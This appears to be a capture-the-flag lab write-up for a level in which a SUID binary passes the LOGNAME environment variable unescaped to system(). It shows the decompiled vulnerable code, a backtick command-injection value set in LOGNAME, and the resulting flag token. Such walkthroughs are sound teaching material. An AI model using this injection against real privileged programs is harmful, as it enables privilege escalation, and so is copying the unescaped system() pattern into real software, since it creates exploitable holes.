# Level 07 - Environment Variable Command Injection

This level centers around exploiting how a SUID binary (`level07`) uses user-controlled environment variables in a vulnerable way.

---

## Step 1: Review Files

```bash
ls -la
```

Output:

```
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
```

The binary is owned by `flag07` and has the SUID bit, which means it will run with `flag07`'s privileges.

---

## Step 2: Decompile the Binary

Decompiled logic (from Dogbolt or similar):

```c
int main(int argc, char** argv, char** envp) {
    gid_t gid = getegid();
    uid_t uid = geteuid();
    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);

    char* cmd;
    asprintf(&cmd, "/bin/echo %s", getenv("LOGNAME"));
    return system(cmd);
}
```

The program builds a shell command using the `LOGNAME` environment variable and executes it using `system()` — a command injection vulnerability.

---

## Step 3: Exploit via Environment Variable

We inject a command using backticks:

```bash
export LOGNAME='`getflag`'
```

Then run the binary:

```bash
./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

---

## Step 4: Result

The SUID binary executes `getflag` under `flag07`'s privileges.

### Flag Token:

```text
fiumuikeil55xe9cu4dood66h
```

---

## ✅ Summary

- `asprintf()` builds a shell command using unescaped environment input.
- `system()` executes it, leading to command injection.
- Successfully hijacked execution via `LOGNAME`.
